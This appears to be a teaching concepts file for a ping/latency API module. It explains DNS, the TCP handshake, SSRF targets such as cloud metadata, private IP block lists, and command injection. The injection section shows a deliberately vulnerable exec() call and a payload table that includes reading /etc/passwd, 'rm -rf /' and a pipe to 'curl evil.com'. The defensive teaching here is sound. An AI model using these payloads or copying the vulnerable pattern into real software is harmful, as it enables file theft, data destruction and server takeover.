# 03-CONCEPTS.md — Ping API with Latency (M15)

## 1. DNS Resolution (Deep Dive)

### WHAT

DNS (Domain Name System) translates human-readable hostnames (`google.com`) into IP addresses (`142.250.80.46`). It is the first step of every outbound network connection.

### HOW

```
User requests: GET /latency?target=google.com

         ┌─────────────┐
         │   Client    │
         └──────┬──────┘
                │ HTTP request
                ▼
         ┌─────────────┐
         │  App Server │
         └──────┬──────┘
                │ dns.promises.lookup("google.com")
                ▼
         ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
         │  DNS Cache  │────►│  Recursive  │────►│ Root/TLD/   │
         │  (OS/Node)  │     │  Resolver   │     │ Authoritative│
         └─────────────┘     └─────────────┘     └─────────────┘
                │
                │ Returns: { address: "142.250.80.46", family: 4 }
                ▼
         ┌─────────────┐
         │  App Server │  ← measures DNS time
         └─────────────┘
```

**The resolution chain:**
1. Check OS-level DNS cache (e.g., `systemd-resolved`, macOS `mDNSResponder`).
2. If miss, query the configured recursive resolver (e.g., `8.8.8.8`, `1.1.1.1`).
3. The recursive resolver queries root servers (`.`), then TLD servers (`.com`), then authoritative servers for `google.com`.
4. The result is cached at multiple levels (OS, Node.js internal cache, DNS TTL).

**Timing:**
- Cached lookup: ~0.1–5 ms
- Uncached local resolver: ~10–50 ms
- Full recursive resolution: ~50–300 ms

### WHY IT MATTERS

DNS is often the slowest part of a cold connection. Measuring it separately from TCP gives you observability into whether slowness is:
- **DNS-related**: Resolver issues, TTL expiration, DNSSEC overhead.
- **Network-related**: Packet loss, routing, congestion.

---

## 2. TCP Three-Way Handshake (Deep Dive)

### WHAT

TCP (Transmission Control Protocol) establishes a reliable, ordered, error-checked connection between two hosts. The handshake is three packets:

### HOW

```
Client (App Server)                         Server (Target Host)

     │                                              │
     │  ──────────── SYN ─────────────────────────► │  "I want to connect."
     │               seq=x                          │
     │                                              │
     │  ◄─────────── SYN-ACK ────────────────────── │  "I got it. I want to connect too."
     │               seq=y, ack=x+1                 │
     │                                              │
     │  ──────────── ACK ─────────────────────────► │  "I got your SYN-ACK. Let's talk."
     │               ack=y+1                        │
     │                                              │
```

**Packet details:**
- **SYN**: Client sends a synchronize packet with a random initial sequence number (`seq=x`).
- **SYN-ACK**: Server acknowledges (`ack=x+1`) and sends its own sequence number (`seq=y`).
- **ACK**: Client acknowledges (`ack=y+1`). The connection is now established.

**Latency measurement:**
```typescript
const start = performance.now();
socket.connect(port, ip, () => {
  const latency = performance.now() - start; // SYN → SYN-ACK → ACK
});
```

This measures **RTT/2** approximately (one round-trip). It does not include application data transfer.

### WHY IT MATTERS

The TCP handshake is the purest measure of network latency:
- No DNS overhead (already resolved).
- No TLS negotiation (not measured here).
- No server application processing (we disconnect immediately after handshake).

In distributed systems, TCP handshake time reveals:
- Geographic distance (speed of light: ~5ms per 1000km round-trip).
- Network congestion or packet loss (SYN retransmissions).
- Firewall or ACL blocking (SYN timeout or RST).

---

## 3. SSRF (Server-Side Request Forgery) Attacks

### WHAT

SSRF occurs when an attacker can cause the server to make requests to arbitrary destinations — including internal services that are not exposed to the internet.

### HOW: The Attack Flow

```
Attacker ──► Internet ──► Your API Server ──► Internal Network

1. Attacker sends: GET /latency?target=169.254.169.254
2. Your server resolves (or skips DNS) and connects to AWS metadata service
3. Server returns metadata (IAM credentials, instance profile, network config)
4. Attacker uses leaked credentials to access S3, EC2, etc.
```

**Common SSRF targets:**

| Target | IP / Hostname | Data Exposed |
|--------|--------------|--------------|
| AWS Metadata | `169.254.169.254` | IAM role credentials, user-data scripts |
| GCP Metadata | `169.254.169.254` | Access tokens, service account keys |
| Azure Metadata | `169.254.169.254` | Management tokens, subscription info |
| Kubernetes API | `10.0.0.1:443` | Pod lists, secrets, cluster config |
| Internal DB | `10.0.3.15:5432` | PostgreSQL, MySQL, Redis |
| Local services | `127.0.0.1:8080` | Admin panels, debug endpoints |

### WHY IT MATTERS

SSRF is consistently in the OWASP Top 10. It is a pivot point: an attacker uses your server's trusted network position to access resources they cannot reach directly.

Real-world breaches:
- **Capital One (2019)**: SSRF against AWS metadata service exposed 100M customer records. The attacker used a misconfigured WAF to access `169.254.169.254`.
- **Shopify (2020)**: SSRF in a image-resizing service allowed access to internal GraphQL endpoints.

---

## 4. Private IP Ranges

### WHAT

RFC 1918 defines IPv4 private address spaces. RFC 4193 and RFC 4291 define IPv6 private/link-local spaces. These addresses are non-routable on the public internet and are used for internal networks.

### HOW: The Ranges

**IPv4 Private / Special-Use:**

```
Range                CIDR            Purpose
─────────────────────────────────────────────────────────────
10.0.0.0  – 10.255.255.255    10/8      Private (largest)
172.16.0.0 – 172.31.255.255   172.16/12 Private (medium)
192.168.0.0 – 192.168.255.255 192.168/16 Private (home/SMB)
127.0.0.0 – 127.255.255.255   127/8     Loopback (localhost)
169.254.0.0 – 169.254.255.255 169.254/16 Link-local (APIPA, cloud metadata)
0.0.0.0                       0/8       Current network (source only)
```

**IPv6 Private / Special-Use:**

```
Range                CIDR            Purpose
─────────────────────────────────────────────────────────────
fc00:: – fdff:ffff:...         fc00::/7   Unique local (ULA)
fe80:: – febf:ffff:...         fe80::/10  Link-local
::1                            ::1/128    Loopback
```

### Validation Logic

```typescript
const BLOCKED_RANGES = [
  /^10\./,                           // 10.0.0.0/8
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./, // 172.16.0.0/12
  /^192\.168\./,                     // 192.168.0.0/16
  /^127\./,                          // 127.0.0.0/8
  /^169\.254\./,                     // 169.254.0.0/16
  /^fc00:/i,                         // IPv6 ULA
  /^fe80:/i,                         // IPv6 link-local
];
```

### WHY IT MATTERS

These ranges are the attack surface for SSRF. If your server can reach them, an attacker can reach them through your server. Blocking them is the minimum viable defense.

---

## 5. Command Injection

### WHAT

Command injection occurs when user input is passed to a shell command interpreter (`sh`, `bash`, `cmd.exe`) without proper sanitization. The shell treats metacharacters (`;`, `&&`, `||`, `|`, `` ` ``, `$()`) as command separators and executes multiple commands.

### HOW: The Attack

```javascript
// WRONG (2015-2020 pattern)
import { exec } from 'node:child_process';
const target = req.query.target; // attacker-controlled
exec(`ping -c 1 ${target}`, (err, stdout) => {
  res.send(stdout);
});
```

**Attack payloads:**

| Input | Shell Command Executed | Result |
|-------|------------------------|--------|
| `google.com` | `ping -c 1 google.com` | Normal |
| `google.com; cat /etc/passwd` | `ping -c 1 google.com; cat /etc/passwd` | File leak |
| `google.com && rm -rf /` | `ping -c 1 google.com && rm -rf /` | Destruction |
| `google.com \| curl evil.com` | `ping -c 1 google.com \| curl evil.com` | Data exfil |
| `` google.com`whoami` `` | `` ping -c 1 google.com`whoami` `` | Command execution |

### WHY IT MATTERS

Command injection is a **Critical** severity vulnerability (CVSS 9.8+). It grants arbitrary code execution on the server.

Real-world breaches:
- **Equifax (2017)**: While primarily a Struts vulnerability, subsequent lateral movement involved command injection on internal tools.
- **Numerous IoT botnets**: Devices that pass user input to `system()` or `popen()` are trivially exploited by Mirai variants.

### WRONG vs RIGHT

| WRONG | RIGHT |
|-------|-------|
| `exec('ping -c 1 ' + target)` | `dns.promises.lookup()` + `net.Socket.connect()` |
| `execSync('curl ' + url)` | Use `fetch()` or `http.request()` |
| Escape shell metacharacters manually | Do not use shell APIs at all |
| `spawn('ping', ['-c', '1', target])` (still risky if args are not validated) | Use pure Node.js APIs with no shell involvement |

## SOURCES

- [RFC 1918 — Private Address Space](https://datatracker.ietf.org/doc/html/rfc1918)
- [RFC 4193 — Unique Local IPv6 Unicast Addresses](https://datatracker.ietf.org/doc/html/rfc4193)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- PortSwigger, "SSRF," 2023.
